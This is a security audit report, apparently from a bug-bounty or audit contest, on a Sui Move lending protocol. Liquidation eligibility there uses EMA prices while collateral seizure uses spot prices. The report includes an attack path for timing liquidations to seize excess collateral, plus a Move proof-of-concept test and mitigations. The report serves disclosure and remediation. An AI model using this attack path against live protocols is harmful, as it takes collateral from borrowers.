### Liquidator will extract excess collateral from borrowers due to spot/EMA price inconsistency in seizure calculation

### Summary

Inconsistent price oracle usage between eligibility check (`get_price`/EMA) and seizure calculation (`get_spot_price`) in the liquidation path will cause excess collateral loss for borrowers as a liquidator will time liquidations during EMA-spot price divergence to seize more collateral than the EMA-based health check would justify.

### Root Cause

In [`market.move:1045-1046`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/contracts/protocol/sources/internal/market/market.move#L1045-L1046), the collateral seizure calculation uses **spot prices**:

```move
let price_borrowed = get_spot_price(x_oracle, debt_type, oracle_base_token, clock);
let price_collateral = get_spot_price(x_oracle, collateral_type, oracle_base_token, clock);
```

While in [`market.move:1115`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/contracts/protocol/sources/internal/market/market.move#L1115) and [`market.move:1155`](https://github.com/pebble-protocol/sui-move-contract/blob/8a250918a763b63449a767482a4c4a5079b30893/contracts/protocol/sources/internal/market/market.move#L1155), the eligibility check uses **EMA prices** via `get_price`.

Critically, `liquidate_calculate_seize_ctokens` does **not** use `get_price_with_check` (which enforces EMA-spot divergence tolerance). The non-liquidation paths (`debts_value_usd_non_liquidation`, `collaterals_usd_non_liquidation`) use `get_price_with_check` with a configurable tolerance (default 10%), but the liquidation seizure path has **no** such guard.

### Internal Pre-conditions

1. [Borrower's obligation needs to reach a liquidatable state to set] weighted_debts to be at least higher than collateral_weighted_value based on EMA prices.
2. [Oracle price feeds need to diverge to set] EMA-spot price divergence for the debt or collateral token to be at least non-trivial (e.g., >1%).

### External Pre-conditions

1. Market volatility needs to cause the spot price to diverge from the EMA price for either the debt token or collateral token.

### Attack Path

1. Liquidator monitors obligations near the liquidation threshold.
2. Liquidator waits for a moment when the spot price of the debt token is **higher** than EMA (or collateral spot is **lower** than EMA).
3. Liquidator calls `liquidate()` at `liquidate.move:133`.
4. `ensure_liquidate_borrow_allowed` passes using EMA prices (obligation is liquidatable by EMA).
5. `liquidate_calculate_seize_ctokens` computes seizure using spot prices: `seized = repay_amount * (1 + incentive) * spot_debt_price / spot_collateral_price / exchange_rate`.
6. Because spot debt price > EMA debt price (or spot collateral price < EMA collateral price), the liquidator seizes **more** collateral than the EMA-based eligibility check would justify.
7. The borrower loses excess collateral proportional to the EMA-spot divergence.

### Impact

The borrower suffers excess collateral loss proportional to the EMA-spot price divergence. With the default EMA-spot tolerance of 10% (which is NOT enforced on the liquidation seizure path), a liquidator can extract up to ~10% more collateral than what the EMA-based health check would fairly warrant. For example, on a $10,000 liquidation with a 10% EMA-spot divergence on the debt token, the liquidator seizes ~$1,000 of additional collateral beyond what the EMA valuation justifies. The liquidator gains the excess collateral as additional profit.

### PoC

**File:** `poc_003_spot_ema_excess_seizure.move`
```move
// PoC for Report #003: Spot/EMA Price Inconsistency in Liquidation Seizure
//
// Target: contracts/protocol/sources/internal/market/market.move:1045-1046
// Place in: contracts/protocol/tests/integration/test_cases/
// Run:   sui move test --filter poc_003
//
// PREREQUISITE: Apply the patch in poc_helper_x_oracle_divergent.move
//               (add update_price_divergent to x_oracle.move)
//
// Bug: liquidate_calculate_seize_ctokens uses get_spot_price for seizure
//      while ensure_liquidate_borrow_allowed uses get_price (EMA) for
//      eligibility. When collateral spot < EMA, the borrower loses MORE
//      collateral than the EMA-based valuation justifies.
//
// Scenario:
//   ETH collateral, USDC debt
//   ETH EMA = $500, ETH spot = $450 (10% divergence, within tolerance)
//   Position is barely liquidatable at EMA
//   Seizure computed at spot ($450) extracts ~11% more collateral
//
// Expected: test PASSES, proving excess seizure

#[test_only]
module protocol::poc_003_spot_ema_excess_seizure {
    use sui::test_scenario;
    use sui::clock;

    use protocol::market_t::MainMarket;
    use test_coin::eth::ETH;
    use test_coin::usdc::USDC;
    use protocol::oracle_t;
    use protocol::open_obligation_t;
    use protocol::market_t::default_eth_decimal_places;
    use protocol::market_t::default_stable_decimal_places;

    const ADMIN: address = @0xAD;
    const BORROWER: address = @0xBB;
    const LIQUIDATOR: address = @0xCC;

    /// Proves that when collateral spot price < EMA price, the borrower
    /// loses excess collateral during liquidation.
    ///
    /// The seizure formula at market.move:1045-1046 uses get_spot_price,
    /// while eligibility at market.move:1115 uses get_price (EMA).
    /// When spot < EMA for collateral, seize_ctokens = repay * incentive
    /// * debt_price / (collateral_SPOT * exchange_rate) is larger than
    /// the fair value computed with EMA.
    #[test]
    fun test_spot_ema_excess_seizure() {
        let mut scenario_value = test_scenario::begin(ADMIN);
        let scenario = &mut scenario_value;
        let mut clock = clock::create_for_testing(scenario.ctx());

        // Step 1: Init market
        let (admin_cap, mut app, mut market, coin_registry) =
            protocol::app_t::default_app_init<MainMarket>(scenario, &mut clock, ADMIN);
        let mut x_oracle = oracle_t::init_t(scenario);

        // Step 2: Set initial prices (spot == EMA) — position setup
        clock.set_for_testing(100_000);
        x_oracle.update_price<ETH>(&clock, oracle_t::calc_scaled_price(1000, 0));  // $1000
        x_oracle.update_price<USDC>(&clock, oracle_t::calc_scaled_price(1, 0));    // $1

        // Step 3: Borrower deposits 2 ETH ($2000) and borrows USDC
        scenario.next_tx(BORROWER);
        let borrower_cap = open_obligation_t::open_obligation_t<MainMarket>(
            scenario, &app, &mut market
        );

        // Deposit 2 ETH
        let eth_amount = 2 * 10u64.pow(default_eth_decimal_places());
        let eth_coin = sui::coin::mint_for_testing<ETH>(eth_amount, scenario.ctx());
        protocol::deposit::deposit<MainMarket, ETH>(
            &app, &mut market, &borrower_cap, eth_coin, &clock, scenario.ctx()
        );

        // Borrow 1200 USDC (safe: $2000 * 70% CF = $1400 > $1200)
        scenario.next_tx(BORROWER);
        let usdc_borrow = 1200 * 10u64.pow(default_stable_decimal_places());
        let borrowed_usdc = protocol::borrow::borrow<MainMarket, USDC>(
            &app, &borrower_cap, &mut market, &coin_registry,
            usdc_borrow, &x_oracle, &clock, scenario.ctx()
        );
        std::unit_test::destroy(borrowed_usdc);

        // Step 4: Drop ETH price to make position liquidatable
        // Divergent: EMA = $500 (eligibility), spot = $450 (seizure)
        // At EMA $500: 2 ETH = $1000, weighted = $1000 * 70% = $700
        // Debt $1200 > $700 → liquidatable
        //
        // PREREQUISITE: update_price_divergent must be added to x_oracle
        clock.set_for_testing(101_000);
        x_oracle.update_price_divergent<ETH>(
            &clock,
            oracle_t::calc_scaled_price(450, 0),  // spot = $450
            oracle_t::calc_scaled_price(500, 0),   // ema = $500
        );

        // Step 5: Setup liquidation permission
        scenario.next_tx(LIQUIDATOR);
        let permit = protocol::whitelist_admin::mint_new_whitelist(
            &admin_cap, &mut app, scenario.ctx()
        );
        protocol::whitelist_admin::update_permission(
            &admin_cap, &mut app, object::id(&permit),
            protocol::whitelist_admin::liquidation(), true
        );

        // Step 6: Liquidate with 600 USDC (50% of $1200 debt)
        let repay_amount = 600 * 10u64.pow(default_stable_decimal_places());
        let usdc_repay = sui::coin::mint_for_testing<USDC>(repay_amount, scenario.ctx());
        let (seized_eth, refund_usdc) =
            protocol::liquidate::liquidate_as_coin<MainMarket, USDC, ETH>(
                &app, &permit, borrower_cap.id(), &mut market,
                usdc_repay, &coin_registry, &x_oracle, &clock, scenario.ctx()
            );

        // Step 7: Verify excess seizure
        //
        // ACTUAL seizure (spot = $450):
        //   seized = 600 * 1.05 / $450 = 630 / 450 = 1.4 ETH
        //   = 140_000_000 (8 decimals)
        //
        // FAIR seizure (EMA = $500):
        //   seized = 600 * 1.05 / $500 = 630 / 500 = 1.26 ETH
        //   = 126_000_000 (8 decimals)
        //
        // Excess: 1.4 - 1.26 = 0.14 ETH ≈ $70 at EMA ($63 at spot)
        //         That's 11.1% excess on a $600 repayment.

        let seized_amount = seized_eth.value();

        // Fair seizure at EMA = 1.26 ETH = 126_000_000 in 8-decimal atoms
        let fair_seizure_at_ema = 126_000_000u64;

        // Assert: actual seizure > fair seizure (EXCESS PROVEN)
        assert!(seized_amount > fair_seizure_at_ema, 0);

        // Assert: the excess is approximately 11% of fair seizure
        let excess = seized_amount - fair_seizure_at_ema;
        assert!(excess > fair_seizure_at_ema / 10, 1);  // excess > 10% of fair

        // Full refund check: all 600 USDC was consumed (no refund)
        assert!(refund_usdc.value() == 0, 2);

        // Cleanup
        std::unit_test::destroy(seized_eth);
        std::unit_test::destroy(refund_usdc);
        clock::destroy_for_testing(clock);
        test_scenario::return_shared(market);
        std::unit_test::destroy(admin_cap);
        std::unit_test::destroy(borrower_cap);
        std::unit_test::destroy(app);
        std::unit_test::destroy(permit);
        std::unit_test::destroy(x_oracle);
        std::unit_test::destroy(coin_registry);
        scenario_value.end();
    }
}
```

### Mitigation

Either:
1. Use EMA prices (via `get_price`) for the seizure calculation as well, ensuring consistency with the eligibility check.
2. Use `get_price_with_check` in `liquidate_calculate_seize_ctokens` to enforce the EMA-spot tolerance and revert liquidations during extreme divergence periods.
3. Use the minimum of spot and EMA for the debt price and maximum for the collateral price in the seizure calculation, ensuring the calculation never exceeds the EMA-based valuation.